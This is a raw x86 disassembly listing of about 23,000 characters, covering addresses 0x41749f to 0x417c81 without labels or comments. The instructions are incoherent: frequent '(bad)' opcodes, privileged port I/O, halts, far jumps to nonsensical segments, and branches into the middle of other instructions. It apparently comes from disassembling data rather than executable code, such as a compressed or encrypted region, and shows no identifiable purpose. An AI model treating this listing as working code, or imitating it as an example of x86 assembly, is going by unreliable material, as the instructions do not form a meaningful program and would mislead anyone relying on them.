  41749f:	call   0xe4ba:0xb5ed2603
  4174a6:	jbe    0x417494
  4174a8:	es xlat BYTE PTR es:[ebx]
  4174ab:	mov    al,ds:0xf3e699fa
  4174b0:	push   ebp
  4174b1:	mov    eax,0xf8901f27
  4174b6:	nop
  4174b7:	fwait
  4174b8:	in     al,0x9a
  4174ba:	pushf  
  4174bb:	icebp  
  4174bc:	and    al,0x8b
  4174be:	pop    esp
  4174bf:	push   0xf0ab7fd0
  4174c4:	or     esi,edx
  4174c6:	in     al,dx
  4174c7:	push   esp
  4174c8:	mov    eax,ds:0xcd15013c
  4174cd:	mov    bl,0xbc
  4174cf:	pop    ebp
  4174d0:	jmp    0x4fb3:0xba5f7031
  4174d7:	dec    ecx
  4174d8:	sbb    esp,DWORD PTR [edi-0x31]
  4174db:	jge    0x41748f
  4174dd:	xchg   edi,eax
  4174de:	nop
  4174df:	(bad)  
  4174e0:	lods   eax,DWORD PTR ds:[esi]
  4174e1:	out    dx,al
  4174e2:	or     DWORD PTR [esi],ebx
  4174e4:	les    eax,FWORD PTR [eax]
  4174e6:	cmp    eax,0xccbbd37f
  4174eb:	mov    ch,0xc6
  4174ed:	xchg   edi,eax
  4174ee:	in     al,0x80
  4174f0:	(bad)  
  4174f1:	mov    esp,0xfef29887
  4174f6:	scas   eax,DWORD PTR es:[edi]
  4174f7:	out    dx,eax
  4174f8:	mov    dl,0x38
  4174fa:	push   edx
  4174fb:	sub    eax,0xf1c91e2a
  417500:	ret    0x52b9
  417503:	nop
  417504:	sahf   
  417505:	jbe    0x417505
  417507:	push   es
  417508:	sar    BYTE PTR [edx+0x63],cl
  41750b:	inc    edx
  41750c:	mov    ds:0x991cc342,al
  417511:	sti    
  417512:	cli    
  417513:	fwait
  417514:	je     0x417573
  417516:	cmp    eax,0xd3219362
  41751b:	mov    eax,0x7307524
  417520:	stos   BYTE PTR es:[edi],al
  417521:	mov    edx,0x25b1d76c
  417526:	ror    BYTE PTR [ecx],0x2a
  417529:	sbb    eax,0x40739bc4
  41752e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41752f:	daa    
  417530:	ja     0x417516
  417532:	mov    ah,0x5c
  417534:	cmc    
  417535:	pop    esi
  417536:	mov    cl,0xdb
  417538:	js     0x4175a5
  41753a:	jo     0x41755c
  41753c:	mov    bh,0x2a
  41753e:	add    eax,0x1e415b33
  417543:	or     edi,ebp
  417545:	mov    ds:0x7681a447,eax
  41754a:	sub    al,0x3e
  41754c:	bound  edi,QWORD PTR [edx]
  41754e:	xchg   BYTE PTR [eax+0x47e04e4d],al
  417554:	imul   eax,DWORD PTR [ebx+0x5b4353d1],0x18f96b3f
  41755e:	pop    ebx
  41755f:	cwde   
  417560:	mov    ds:0x7d098190,eax
  417565:	mov    ds:0xcdde3011,al
  41756a:	aas    
  41756b:	fcom   DWORD PTR [esi-0xa]
  41756e:	or     DWORD PTR [edi-0x6e384b04],esi
  417574:	fld    st(2)
  417576:	mul    DWORD PTR ds:0x571f312c
  41757c:	push   edx
  41757d:	into   
  41757e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41757f:	jnp    0x4175b2
  417581:	fcomp  DWORD PTR [edi-0x3ffafdf8]
  417587:	pusha  
  417588:	neg    DWORD PTR [esi+0x25a8fa9]
  41758e:	add    DWORD PTR [edx],ebx
  417590:	add    esp,ecx
  417592:	pop    es
  417593:	mov    al,0xa3
  417595:	dec    ebx
  417596:	out    0x2d,al
  417598:	xor    edx,ebx
  41759a:	(bad)  
  41759b:	lods   eax,DWORD PTR ds:[esi]
  41759c:	cmp    al,0x3d
  41759e:	aad    0x6f
  4175a0:	mov    ch,BYTE PTR [edi-0x1a]
  4175a3:	xor    DWORD PTR [ecx-0x78dabefa],ebp
  4175a9:	call   0xeb7:0x9fb97f51
  4175b0:	repnz mov ecx,0xf1fe449c
  4175b6:	fs call 0xcbf3:0x1354681c
  4175be:	sbb    esi,DWORD PTR [ecx+0x3b04363a]
  4175c4:	push   es
  4175c5:	sub    eax,0x4d139636
  4175ca:	jmp    0x757c:0x163cf5c
  4175d1:	jae    0x4175f7
  4175d3:	neg    BYTE PTR [edx]
  4175d5:	test   BYTE PTR [esi+0xc],dh
  4175d8:	inc    eax
  4175d9:	iret   
  4175da:	pop    esp
  4175db:	mov    dl,0x76
  4175dd:	jno    0x4175e0
  4175df:	(bad)  
  4175e0:	lock sub edx,0xe5063812
  4175e7:	sbb    ecx,DWORD PTR [esi+0x7759c37e]
  4175ed:	fdivr  QWORD PTR [ebp*2+0x74f867d8]
  4175f4:	cmp    DWORD PTR [eax+0x7a],ebx
  4175f7:	ret    
  4175f8:	add    al,0x49
  4175fa:	dec    esp
  4175fb:	and    ecx,0x4c
  4175fe:	cmc    
  4175ff:	jl     0x4175f1
  417601:	repz dec esi
  417603:	pop    edi
  417604:	das    
  417605:	(bad)  
  417606:	gs cmc 
  417608:	push   esi
  417609:	or     dl,al
  41760b:	pause  
  41760d:	push   esi
  41760e:	sbb    cl,BYTE PTR [eax+0x62]
  417611:	cld    
  417612:	or     eax,0x8b1d4303
  417617:	inc    edi
  417618:	pop    esi
  417619:	cmc    
  41761a:	test   BYTE PTR [ecx],dl
  41761c:	fld    DWORD PTR [edx]
  41761e:	sub    esp,DWORD PTR [ecx-0x6b]
  417621:	scas   al,BYTE PTR es:[edi]
  417622:	and    dl,BYTE PTR [edx+0x1dbcfddf]
  417628:	sbb    eax,0x87a324cb
  41762d:	sub    eax,0xbbbb71a2
  417632:	out    0x8e,eax
  417634:	mov    DWORD PTR [ebx+edi*1+0x4],edi
  417638:	add    BYTE PTR [esi+0x7a],0xe9
  41763c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41763d:	cmpxchg BYTE PTR [esp+ecx*8-0x101efd3c],cl
  417645:	stos   BYTE PTR es:[edi],al
  417646:	mov    bh,0xe1
  417648:	js     0x41766f
  41764a:	cs adc al,0xe6
  41764d:	jns    0xc21bdf08
  417653:	clc    
  417654:	jno    0x41767a
  417656:	fst    DWORD PTR [ebp+0x38]
  417659:	inc    ebp
  41765a:	inc    eax
  41765b:	pop    esp
  41765c:	mov    ecx,0x1cad9918
  417661:	inc    ebx
  417662:	shl    BYTE PTR [eax],1
  417664:	call   0x583c35a1
  417669:	cmp    esi,edx
  41766b:	clc    
  41766c:	es pusha 
  41766e:	sbb    dl,dh
  417670:	js     0x4176a4
  417672:	sbb    eax,0xec005f9b
  417677:	push   ebp
  417678:	sbb    DWORD PTR [ebx+0x1dd2ef7b],ebx
  41767e:	jecxz  0x41769d
  417680:	inc    ebx
  417681:	(bad)  
  417682:	rcl    dh,1
  417684:	(bad)  
  417685:	lods   eax,DWORD PTR ds:[esi]
  417686:	rol    BYTE PTR [eax],1
  417688:	imul   ebp,DWORD PTR [edi-0x6c],0x2a
  41768c:	inc    esi
  41768d:	push   edx
  41768e:	nop
  41768f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417690:	add    cl,BYTE PTR [ebx]
  417692:	icebp  
  417693:	pop    eax
  417694:	mov    ax,0x8e3b
  417698:	(bad)  
  417699:	in     eax,0x23
  41769b:	pushf  
  41769c:	fs jno 0x4176be
  41769f:	pop    esp
  4176a0:	mov    dh,0x29
  4176a2:	mov    bh,0x58
  4176a4:	outs   dx,DWORD PTR ds:[esi]
  4176a5:	call   0x575388eb
  4176aa:	ins    BYTE PTR es:[edi],dx
  4176ab:	sbb    eax,edx
  4176ad:	or     eax,0x9fe415ee
  4176b2:	push   esp
  4176b3:	dec    ebx
  4176b4:	js     0x4176e3
  4176b6:	jmp    0x70fb:0x45542de1
  4176bd:	popa   
  4176be:	mul    DWORD PTR [ebx-0x224fbf80]
  4176c4:	and    eax,0x515c5744
  4176c9:	hlt    
  4176ca:	retf   
  4176cb:	dec    edx
  4176cc:	xchg   ebx,eax
  4176cd:	mov    ds:0x2f38bcd6,eax
  4176d2:	test   eax,0x887ca4b6
  4176d7:	arpl   WORD PTR [ecx-0x64],sp
  4176da:	pusha  
  4176db:	sbb    bh,0xe3
  4176de:	std    
  4176df:	aam    0xaf
  4176e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4176e2:	xchg   ecx,eax
  4176e3:	mov    eax,DWORD PTR [eax-0x26]
  4176e6:	cmp    al,0x11
  4176e8:	jle    0x4176ec
  4176ea:	jecxz  0x41766e
  4176ec:	mov    eax,ds:0xa6538864
  4176f1:	aas    
  4176f2:	xor    cl,BYTE PTR [esi+0x2af8a45a]
  4176f8:	sbb    al,0xfc
  4176fa:	stc    
  4176fb:	lods   eax,DWORD PTR ds:[esi]
  4176fc:	jecxz  0x41768c
  4176fe:	lock stos BYTE PTR es:[edi],al
  417700:	(bad)  [ebp-0x74]
  417703:	and    ebx,DWORD PTR [ecx+0x3d886905]
  417709:	jle    0x417758
  41770b:	sbb    DWORD PTR [edx-0x3e],edi
  41770e:	mov    ecx,0xad4a7cb
  417713:	fisubr WORD PTR [ebx+0x38]
  417716:	adc    eax,DWORD PTR [ecx+edi*8-0x10]
  41771a:	sbb    DWORD PTR [ecx+0x3e],ebx
  41771d:	xchg   edi,eax
  41771e:	nop
  41771f:	je     0x41779c
  417721:	fs into 
  417723:	push   cs
  417724:	push   0xe52a79c6
  417729:	imul   BYTE PTR [ecx]
  41772b:	cld    
  41772c:	pop    esi
  41772d:	jnp    0x4177ad
  41772f:	add    DWORD PTR [ebp-0x31],ebx
  417732:	or     al,0xcf
  417734:	sbb    DWORD PTR ds:0x6fd53172,edx
  41773a:	sbb    DWORD PTR [ecx+esi*8],ebx
  41773d:	(bad)  
  41773e:	out    dx,al
  41773f:	sti    
  417740:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417741:	arpl   WORD PTR [esi],bx
  417743:	nop
  417744:	or     ecx,DWORD PTR [edi+0x3]
  417747:	mov    eax,ds:0x41e2faef
  41774c:	fs popf 
  41774e:	imul   ebp,DWORD PTR [eax+0x1b5db6fb],0xfffffff0
  417755:	jmp    0x71ba:0x71c9a22a
  41775c:	jbe    0x41774e
  41775e:	sub    eax,DWORD PTR [edi-0x7e7931ae]
  417764:	cmp    ah,BYTE PTR [ecx-0x1a3f36b7]
  41776a:	xlat   BYTE PTR ds:[ebx]
  41776b:	je     0x417761
  41776d:	jecxz  0x4177e5
  41776f:	stos   BYTE PTR es:[edi],al
  417770:	test   al,0xe7
  417772:	icebp  
  417773:	add    eax,0xe40fee27
  417778:	fmul   st,st(7)
  41777a:	inc    esi
  41777b:	test   eax,0x9e0c88ed
  417780:	(bad)  
  417781:	push   esi
  417782:	push   esi
  417783:	nop
  417784:	xchg   ebp,eax
  417785:	rcr    DWORD PTR [edx],0x26
  417788:	xchg   ebx,eax
  417789:	xor    DWORD PTR [eax+edx*2],0x72
  41778d:	(bad)  
  41778f:	and    ecx,esp
  417791:	test   al,0xfa
  417793:	sub    al,0x88
  417795:	popf   
  417796:	pop    edx
  417797:	jecxz  0x41778a
  417799:	pop    ds
  41779a:	ins    DWORD PTR es:[edi],dx
  41779b:	daa    
  41779c:	push   edx
  41779d:	add    esi,ebp
  41779f:	pop    esi
  4177a0:	outs   dx,BYTE PTR ds:[esi]
  4177a1:	adc    eax,0xd3ac7385
  4177a6:	test   BYTE PTR [ebx],ch
  4177a8:	sub    cl,BYTE PTR [eax]
  4177aa:	test   DWORD PTR [edi],0x36ed86b
  4177b0:	fbld   TBYTE PTR [ecx]
  4177b2:	and    esp,DWORD PTR [ecx+esi*4]
  4177b5:	sbb    DWORD PTR [ebp-0x64],eax
  4177b8:	inc    edx
  4177b9:	test   DWORD PTR [edx],esp
  4177bb:	or     al,0x2e
  4177bd:	push   eax
  4177be:	adc    DWORD PTR [edx],edx
  4177c0:	pop    esi
  4177c1:	stos   BYTE PTR es:[edi],al
  4177c2:	xchg   ebx,eax
  4177c3:	xor    edi,DWORD PTR ds:[ecx-0x795fe504]
  4177ca:	repnz xor BYTE PTR [ebx],dh
  4177cd:	loopne 0x4177aa
  4177cf:	inc    esi
  4177d0:	lods   eax,DWORD PTR ds:[esi]
  4177d1:	pop    esp
  4177d2:	loop   0x417830
  4177d4:	mul    DWORD PTR ds:0x9b30af3e
  4177da:	xlat   BYTE PTR ds:[ebx]
  4177db:	loope  0x4177ac
  4177dd:	xchg   BYTE PTR [esi],ah
  4177df:	fcomp  DWORD PTR [ebx+0x71]
  4177e2:	mov    ecx,0xd19982ce
  4177e7:	xchg   ebp,eax
  4177e8:	rcr    cl,0x78
  4177eb:	(bad)  
  4177ec:	ficom  DWORD PTR [edi+0x5a]
  4177ef:	jae    0x4177cc
  4177f1:	fucomip st,st(5)
  4177f3:	cmp    BYTE PTR [ebp+0x7],al
  4177f6:	inc    ecx
  4177f7:	lea    ebp,[edx+esi*4-0x70]
  4177fb:	div    DWORD PTR [ebp-0x15]
  4177fe:	sahf   
  4177ff:	mov    ds:0x1cdafdf9,al
  417804:	and    ebp,ecx
  417806:	or     DWORD PTR [eax],ebx
  417808:	xchg   edx,eax
  417809:	inc    eax
  41780a:	sti    
  41780b:	(bad)  
  41780c:	retf   0x23b0
  41780f:	pushf  
  417810:	fldpi  
  417812:	and    eax,0xd4b21deb
  417817:	cdq    
  417818:	push   ebp
  417819:	les    eax,FWORD PTR ds:0xe96198bc
  41781f:	out    0x9e,al
  417821:	cmp    cl,ch
  417823:	mov    esi,0x137b835f
  417828:	and    DWORD PTR [edi+0x7638d253],ebp
  41782e:	sub    eax,0x144e5c54
  417833:	and    DWORD PTR [esi],esi
  417835:	mov    cs,WORD PTR [ebp+0x72abd35a]
  41783b:	cmc    
  41783c:	xor    DWORD PTR ds:0xacccd2b1,esp
  417842:	(bad)  
  417843:	mov    edi,0x59d79652
  417848:	cmp    esi,0xffffffc0
  41784b:	mov    al,0xbe
  41784d:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  41784f:	jmp    0x3a3f1321
  417854:	mov    al,0xe3
  417856:	imul   ecx,DWORD PTR [edi],0x545a52a6
  41785c:	add    dh,ah
  41785e:	push   ebx
  41785f:	sbb    dh,BYTE PTR [eax]
  417861:	in     eax,0x45
  417863:	fsubr  st,st(6)
  417865:	jge    0x417825
  417867:	pop    esp
  417868:	push   ds
  417869:	cmp    eax,0xf8dc8ca8
  41786e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41786f:	mov    eax,ds:0x6c5fe14
  417874:	jg     0x4178ab
  417876:	vpmaxsd xmm0{k7},xmm4,XMMWORD PTR [ebp+0x400]
  41787d:	mov    ecx,0xd7991caa
  417882:	sbb    eax,0x418e3aae
  417887:	mov    ch,0x62
  417889:	lods   eax,DWORD PTR ds:[esi]
  41788a:	inc    edx
  41788b:	jp     0x4178a3
  41788d:	xor    al,BYTE PTR [ebx-0x72bfebdc]
  417893:	dec    edi
  417894:	cdq    
  417895:	xor    edx,DWORD PTR [esi+edx*1]
  417898:	pop    es
  417899:	ficomp WORD PTR [edi-0x2fe87ff3]
  41789f:	stos   DWORD PTR es:[edi],eax
  4178a0:	push   edi
  4178a1:	push   cs
  4178a2:	jne    0x4178e2
  4178a4:	sbb    al,0x1
  4178a6:	sub    BYTE PTR [edi],dh
  4178a8:	(bad)  [ebp-0x534b8221]
  4178ae:	mov    edx,0xace35072
  4178b3:	jg     0x41786e
  4178b5:	fs int3 
  4178b7:	lods   eax,DWORD PTR ds:[esi]
  4178b8:	out    0xd6,al
  4178ba:	js     0x4178e2
  4178bc:	mov    ds:0x50576db2,al
  4178c1:	hlt    
  4178c2:	ins    BYTE PTR es:[edi],dx
  4178c3:	lds    edi,FWORD PTR [esp+ebp*8-0x5f]
  4178c7:	arpl   di,di
  4178c9:	gs adc DWORD PTR ss:[edx+0xf],eax
  4178ce:	adc    eax,0x6631bb76
  4178d3:	jb     0x417862
  4178d5:	and    al,0x57
  4178d7:	scas   eax,DWORD PTR es:[edi]
  4178d8:	adc    BYTE PTR [eax+0x4ad2f012],0xc
  4178df:	pop    esi
  4178e0:	sahf   
  4178e1:	ins    DWORD PTR es:[edi],dx
  4178e2:	sahf   
  4178e3:	sbb    bh,BYTE PTR [ebx-0x2e340e85]
  4178e9:	ds mov ebp,cs
  4178ec:	or     eax,0x335ae976
  4178f1:	aas    
  4178f2:	add    ebx,0x8
  4178f5:	fmulp  st(7),st
  4178f7:	aas    
  4178f8:	lods   al,BYTE PTR ds:[esi]
  4178f9:	or     eax,0xac1c5519
  4178fe:	pandn  mm3,mm2
  417901:	sub    esi,DWORD PTR [ebp+esi*8+0x7c]
  417905:	or     eax,0x34619595
  41790a:	mov    esi,0x9ac54ef0
  41790f:	nop
  417910:	sub    ah,BYTE PTR [edi-0xdba6207]
  417916:	jle    0x417927
  417918:	mov    ?,WORD PTR [ecx]
  41791a:	jnp    0x41798a
  41791c:	fisttp QWORD PTR [eax-0xc]
  41791f:	out    0x89,eax
  417921:	cmovs  esi,ebx
  417924:	pop    ebp
  417925:	push   edi
  417926:	dec    edi
  417927:	clc    
  417928:	outs   dx,BYTE PTR ds:[esi]
  417929:	sar    DWORD PTR [edx+eax*2+0x5127b6c0],cl
  417930:	loop   0x41790b
  417932:	push   cs
  417933:	inc    eax
  417934:	jp     0x4178db
  417936:	xlat   BYTE PTR ds:[ebx]
  417937:	or     eax,0x9efcbe6b
  41793c:	imul   esp,DWORD PTR [ebp-0x24],0x16
  417940:	add    eax,0x93a4f1d7
  417945:	lahf   
  417946:	mov    bh,0xd
  417948:	ins    BYTE PTR es:[edi],dx
  417949:	repz out dx,eax
  41794b:	xchg   edx,eax
  41794c:	cmp    BYTE PTR [ebp+0x6e65ba42],0x2c
  417953:	push   ss
  417954:	sti    
  417955:	jae    0x41794c
  417957:	stc    
  417958:	call   0x76532b42
  41795d:	(bad)  
  41795e:	aad    0x9b
  417960:	inc    edi
  417961:	es xchg esp,eax
  417963:	sbb    al,0xfb
  417965:	out    dx,al
  417966:	pop    edx
  417967:	and    dl,bl
  417969:	aam    0xd
  41796b:	push   cs
  41796c:	adc    edi,esi
  41796e:	aas    
  41796f:	xor    al,0xcc
  417971:	cmp    BYTE PTR [esi],0xb4
  417974:	int3   
  417975:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417976:	xchg   ebx,eax
  417977:	ror    DWORD PTR [esi-0x4dfa1c1a],0x29
  41797e:	pusha  
  41797f:	(bad)  
  417980:	shl    edx,cl
  417982:	cmp    dl,BYTE PTR [edi+0x2c]
  417985:	pop    esi
  417986:	dec    eax
  417987:	sub    eax,DWORD PTR [ecx+eiz*8]
  41798a:	dec    edi
  41798b:	mov    edi,0xdf479eed
  417990:	in     eax,dx
  417991:	xchg   DWORD PTR [ebp-0x3ed2a4ad],esi
  417997:	jbe    0x41797c
  417999:	aam    0x28
  41799b:	(bad)  
  41799c:	or     eax,0x82ea4519
  4179a1:	imul   edx,DWORD PTR [ebp+0x7],0xfffffff2
  4179a5:	lea    ebp,[ecx]
  4179a7:	ret    0x11e8
  4179aa:	mov    eax,0x90134af9
  4179af:	cs sahf 
  4179b1:	cmp    edi,DWORD PTR [edi-0x60]
  4179b4:	jo     0x4179a8
  4179b6:	push   cs
  4179b7:	pop    eax
  4179b8:	push   esi
  4179b9:	femms  
  4179bb:	fdiv   QWORD PTR [eax+0x49c0bdbc]
  4179c1:	dec    ebx
  4179c2:	sbb    edx,DWORD PTR [ebx-0xc]
  4179c5:	mov    dh,0x84
  4179c7:	pop    edi
  4179c8:	scas   eax,DWORD PTR es:[edi]
  4179c9:	inc    esi
  4179ca:	jecxz  0x41797b
  4179cc:	or     ch,BYTE PTR [edi+0x4b7b2077]
  4179d2:	sbb    BYTE PTR [ebp-0x409b99e],cl
  4179d8:	pushf  
  4179d9:	cli    
  4179da:	fmul   DWORD PTR [eax+0x4f]
  4179dd:	dec    ebp
  4179de:	je     0x4179af
  4179e0:	sbb    eax,0x6414fe00
  4179e5:	stc    
  4179e6:	sbb    BYTE PTR [esi],bl
  4179e8:	xchg   BYTE PTR [eax-0x25],dh
  4179eb:	mov    eax,ds:0x5bc9237
  4179f0:	adc    eax,0x29ae6297
  4179f5:	cmp    eax,0x30e9fffb
  4179fa:	push   eax
  4179fb:	lods   al,BYTE PTR ds:[esi]
  4179fc:	mov    esp,0xa550556
  417a01:	mov    edi,0xb55b1e26
  417a06:	mov    eax,0x56bbfcf9
  417a0b:	fld    DWORD PTR [ecx]
  417a0d:	sbb    edi,0xd95cf5a9
  417a13:	imul   ecx,DWORD PTR [ecx-0x4d],0x3b5cab1c
  417a1a:	int    0xfe
  417a1c:	dec    eax
  417a1d:	push   cs
  417a1e:	sub    cl,BYTE PTR [ebp+0xf]
  417a21:	cli    
  417a22:	mov    ds:0x8d8e91d8,eax
  417a27:	pop    ss
  417a28:	fst    QWORD PTR [eax+0x1d]
  417a2b:	or     al,0x5b
  417a2d:	push   eax
  417a2e:	cmp    ebp,DWORD PTR [edx]
  417a30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417a31:	outs   dx,DWORD PTR ds:[esi]
  417a32:	pop    edx
  417a33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417a34:	push   edi
  417a35:	ret    0x146
  417a38:	or     dl,dl
  417a3a:	ja     0x417aa5
  417a3c:	inc    esi
  417a3d:	dec    esi
  417a3e:	cmp    BYTE PTR [ebp-0x62e9c841],ah
  417a44:	imul   edi,DWORD PTR [ecx+0x5b],0x72bae3a6
  417a4b:	ret    0x3640
  417a4e:	mov    dh,0xeb
  417a50:	sbb    edi,DWORD PTR [eax]
  417a52:	jge    0x417aab
  417a54:	int3   
  417a55:	jae    0x4179db
  417a57:	mov    ch,0xf5
  417a59:	cmp    BYTE PTR [esi+0x56def94d],0xa2
  417a60:	sbb    BYTE PTR [eax-0x77],ch
  417a63:	retf   
  417a64:	not    BYTE PTR [ebx-0x798387ea]
  417a6a:	push   ecx
  417a6b:	inc    edx
  417a6c:	pop    ds
  417a6d:	cwde   
  417a6e:	retf   0x719d
  417a71:	mov    esp,0x8a4d9725
  417a76:	ror    DWORD PTR [ebx+0x7],1
  417a79:	pop    edi
  417a7a:	ss gs add eax,0x70a9b7e
  417a81:	ins    BYTE PTR es:[edi],dx
  417a82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417a83:	xlat   BYTE PTR ds:[ebx]
  417a84:	aas    
  417a85:	sub    al,0xcf
  417a87:	pop    ss
  417a88:	mov    ah,0x22
  417a8b:	inc    eax
  417a8c:	adc    BYTE PTR [ebp+0x58],0x83
  417a90:	(bad)  
  417a92:	lock ss add eax,0x73daa4c4
  417a99:	mov    ecx,DWORD PTR [ebp+0x4f]
  417a9c:	data16 stc 
  417a9e:	dec    esi
  417a9f:	mov    bl,0x59
  417aa1:	xchg   edi,eax
  417aa2:	mov    edx,0xb6d472d
  417aa7:	push   edx
  417aa8:	ror    BYTE PTR [edx],cl
  417aaa:	jnp    0x417a45
  417aac:	mov    edx,0x49aeb0c0
  417ab1:	sub    eax,0x2ea0fde9
  417ab6:	push   eax
  417ab7:	cmp    al,0x14
  417ab9:	jno    0x417b2b
  417abb:	repz call 0xdfb6eb26
  417ac1:	mov    edi,0xd64873bb
  417ac6:	mov    ebx,0x7e2c2a5a
  417acb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417acc:	lea    edx,[ecx+0x64]
  417acf:	scas   al,BYTE PTR es:[edi]
  417ad0:	fcmove st,st(6)
  417ad2:	mov    sp,0x36f
  417ad6:	imul   esi,DWORD PTR [edx+ebx*2],0x7920a486
  417add:	nop
  417ade:	(bad)  
  417adf:	jl     0x417a7e
  417ae1:	mov    dh,0x5e
  417ae3:	(bad)  
  417ae4:	mov    al,ds:0x30146daf
  417ae9:	or     eax,0xee9bc44a
  417aee:	rol    BYTE PTR [edi],cl
  417af0:	mov    ch,0xa0
  417af2:	je     0x417ac5
  417af4:	daa    
  417af5:	adc    al,0xd6
  417af7:	jne    0x417b29
  417af9:	sbb    DWORD PTR [eax-0x2f],0x1c
  417afd:	mov    WORD PTR [ebx],ss
  417aff:	mov    al,ch
  417b01:	dec    ebx
  417b02:	xor    DWORD PTR [esi+0x14],esi
  417b05:	repz loope 0x417a89
  417b08:	scas   al,BYTE PTR es:[edi]
  417b09:	shl    cl,0x44
  417b0c:	nop
  417b0d:	inc    edi
  417b0e:	and    eax,0x128fa760
  417b13:	aaa    
  417b14:	push   es
  417b15:	sbb    BYTE PTR [edi+0xf],0x24
  417b19:	inc    bp
  417b1b:	(bad)
  417b1e:	xlat   BYTE PTR ds:[ebx]
  417b1f:	pop    es
  417b20:	adc    BYTE PTR [edx-0x48e3db5a],0x7b
  417b27:	data16 es and al,0xd1
  417b2b:	retf   0x32fb
  417b2e:	adc    BYTE PTR [eax],bl
  417b30:	pop    edx
  417b31:	shr    DWORD PTR [ecx-0x6ea31c92],0xf2
  417b38:	call   0x5518:0x5fe7124f
  417b3f:	push   ecx
  417b40:	lods   al,BYTE PTR ds:[esi]
  417b41:	sbb    ah,BYTE PTR [ebp*8-0x4efa0744]
  417b48:	sub    eax,0x498f225a
  417b4d:	fisttp DWORD PTR [ebx+0x52]
  417b50:	(bad)  
  417b51:	fild   QWORD PTR [eax]
  417b53:	dec    esp
  417b54:	imul   edx,DWORD PTR [edi],0x7c
  417b57:	sti    
  417b58:	fwait
  417b59:	sub    DWORD PTR [ecx],ebx
  417b5b:	jae    0x417b6b
  417b5d:	out    0x4d,eax
  417b5f:	(bad)  
  417b60:	jns    0x417bdd
  417b62:	(bad)  
  417b63:	out    0xa4,al
  417b65:	hlt    
  417b66:	data16 adc BYTE PTR [ecx+0x3a],dh
  417b6a:	mul    BYTE PTR [ebx-0x136af8d8]
  417b70:	ds dec eax
  417b72:	jbe    0x417b05
  417b74:	ficom  DWORD PTR [eax+eax*4+0x2d]
  417b78:	push   ebx
  417b79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417b7a:	in     al,dx
  417b7b:	mov    es,WORD PTR [eax+0x73]
  417b7e:	retf   0xe4c1
  417b81:	out    0x50,al
  417b83:	pop    ecx
  417b84:	adc    eax,0x71110f94
  417b89:	lahf   
  417b8a:	xor    eax,0xa291f924
  417b8f:	outs   dx,BYTE PTR es:[esi]
  417b91:	ins    DWORD PTR es:[edi],dx
  417b92:	(bad)  [ebp+0x72]
  417b95:	or     BYTE PTR [ebp+0x64012576],dh
  417b9b:	dec    esi
  417b9c:	ins    BYTE PTR es:[edi],dx
  417b9d:	aaa    
  417b9e:	mov    ah,0x5
  417ba0:	mov    esi,esp
  417ba2:	xchg   edi,eax
  417ba3:	je     0x417bce
  417ba5:	xor    eax,0x949db347
  417baa:	fstp   DWORD PTR [edx-0x8e2c6d4]
  417bb0:	jl     0x417b33
  417bb2:	mov    dl,al
  417bb4:	mov    esp,0xc4103231
  417bb9:	sbb    DWORD PTR [eax+0x345d1b70],eax
  417bbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417bc0:	push   0xb84252f4
  417bc5:	loopne 0x417b73
  417bc7:	pusha  
  417bc8:	mov    BYTE PTR [ebx],al
  417bca:	xchg   esi,eax
  417bcb:	idiv   DWORD PTR [edi-0x5e]
  417bce:	sub    esi,DWORD PTR [eax-0x2241c4e6]
  417bd4:	or     eax,0x45e2226d
  417bd9:	mov    DWORD PTR [eax],esi
  417bdb:	or     bl,bl
  417bdd:	or     cl,BYTE PTR [eax+0x71]
  417be0:	mov    esi,0xcfbf6144
  417be5:	cs shr cl,cl
  417be8:	mov    esi,0x3f299f46
  417bed:	mov    ds:0x78cc8200,al
  417bf2:	push   eax
  417bf3:	dec    eax
  417bf4:	inc    esi
  417bf5:	pop    ds
  417bf6:	sub    BYTE PTR [edx+0x4e],bh
  417bf9:	idiv   BYTE PTR [esi+0x6723f2a0]
  417bff:	pop    eax
  417c00:	sahf   
  417c01:	lods   eax,DWORD PTR ds:[esi]
  417c02:	(bad)  
  417c03:	mov    eax,ds:0x2b66428
  417c08:	adc    BYTE PTR [edi],cl
  417c0a:	fistp  WORD PTR [esi+0x6c]
  417c0d:	sub    eax,0x1bef6b2b
  417c12:	mov    bh,0x86
  417c14:	les    ebp,FWORD PTR [esi+0x7007a5a0]
  417c1a:	inc    eax
  417c1b:	mov    dh,0x87
  417c1d:	and    eax,ecx
  417c1f:	cmp    BYTE PTR ds:0xa24f4acf,ah
  417c25:	fst    DWORD PTR [ecx+ecx*1-0x65be9576]
  417c2c:	jmp    0x417bea
  417c2e:	jg     0x417c81
  417c30:	jl     0x417c85
  417c32:	mov    esp,0x1c91ffde
  417c37:	cmp    DWORD PTR [ebx+0x6e],0x547f84fb
  417c3e:	fbld   TBYTE PTR [ecx]
  417c40:	pop    ebp
  417c41:	inc    ebx
  417c42:	outs   dx,DWORD PTR ds:[esi]
  417c43:	sub    dl,dl
  417c45:	mov    bl,0xd3
  417c47:	sub    cl,BYTE PTR [ecx+eax*2-0x53d187cf]
  417c4e:	jnp    0x417c50
  417c50:	test   eax,0x1b5bf84f
  417c55:	mov    al,0x1c
  417c57:	repnz mov cl,0xd8
  417c5a:	sub    BYTE PTR [ecx],al
  417c5c:	test   DWORD PTR [ebx-0x4f67ac0c],edi
  417c62:	div    BYTE PTR [eax-0x24c9a01d]
  417c68:	xchg   ecx,eax
  417c69:	or     edi,esi
  417c6b:	sub    BYTE PTR [edi],0xc1
  417c6e:	fimul  WORD PTR [ecx-0x744d169a]
  417c74:	pop    es
  417c75:	xor    BYTE PTR [edi-0x2],0xe8
  417c79:	pop    edi
  417c7a:	or     esp,DWORD PTR [ecx+0x1621e1db]
  417c80:	pop    edi
  417c81:	mov    esp,0x27e0cb34
